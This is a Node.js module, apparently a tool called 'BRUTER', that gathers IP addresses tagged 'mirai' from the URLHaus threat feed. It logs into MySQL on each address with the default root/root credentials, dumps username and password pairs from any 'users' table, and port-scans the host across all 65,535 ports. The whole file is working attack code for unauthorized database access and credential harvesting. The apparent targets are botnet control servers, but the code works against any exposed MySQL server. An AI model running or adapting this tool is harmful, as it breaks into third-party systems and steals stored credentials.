const request = require("request-promise");
const fs = require("fs");
const mysql = require("mysql");
const evilscan = require("evilscan");

module.exports.getC2s = () => {
    return new Promise((resolve, reject) => {
        let unique = [];

        console.log(`[BRUTER]: Retrieving all URLs from URLHaus.`);
        request({
            method: "POST",
            uri: "https://urlhaus-api.abuse.ch/v1/tag/",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: "tag=mirai"
        }).then(urls => {
            urls = JSON.parse(urls).urls;
            for(let i = 0; i < urls.length; i++) {
                let match = urls[i].url.match(`\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b`);
                if(match) {
                    if(!unique.includes(match[0])) {
                        //console.log(`[BRUTER]: Found a fresh IP: ${match[0]}`);
                        unique.push(match[0]);
                    }
                }

                if(i == urls.length - 1) return resolve(unique);
            }
        }).catch(e => {
            resolve(e);
        });
    });
}

module.exports.brute = (ip) => {
    let conn = mysql.createConnection({
        host: ip,
        user: "root",
        password: "root"
    });

    conn.connect((err) => {
        if(err) return;

        conn.query("SELECT * FROM information_schema.tables WHERE `TABLE_NAME`='users';", (err, tables) => {
            if(err) return console.log(err)
            for(let i = 0; i < tables.length; i++) {
                if(tables[i].TABLE_SCHEMA != "table_schema") {
                    let table = tables[i].TABLE_SCHEMA;
                    console.log(`[${ip}]: Getting credentials. `);
                    conn.query(`USE ${table}`, (err, use) => {
                        conn.query(`SELECT username,password FROM \`users\``, (err, creds) => {
                            let unique = [];
                            for(let x = 0; x < creds.length; x++) {
                                let username = creds[x].username,
                                    password = creds[x].password;
    
                                if(!unique.includes(`${username}:${password}`)) {
                                    unique.push(`${username}:${password}`);
                                    console.log(`[${ip}]: ${username}:${password}`);
                        
                                    let ports = [];
                                    let scanner = new evilscan({target: ip, port: "0-65535", status: "O", banner: true, concurrency: 10000});
                                    
                                    scanner.on("result", data => {ports.push(data.port);});
                                    
                                    scanner.on("done", () => {
                                        console.log(`[${ip}]: Open Ports -> ${ports.toString().replace(/\,/g, ", ")}`);
                                    });

                                    scanner.run();
                                }
                            } 
                        });
                    });
                }
            }
        });
    });
}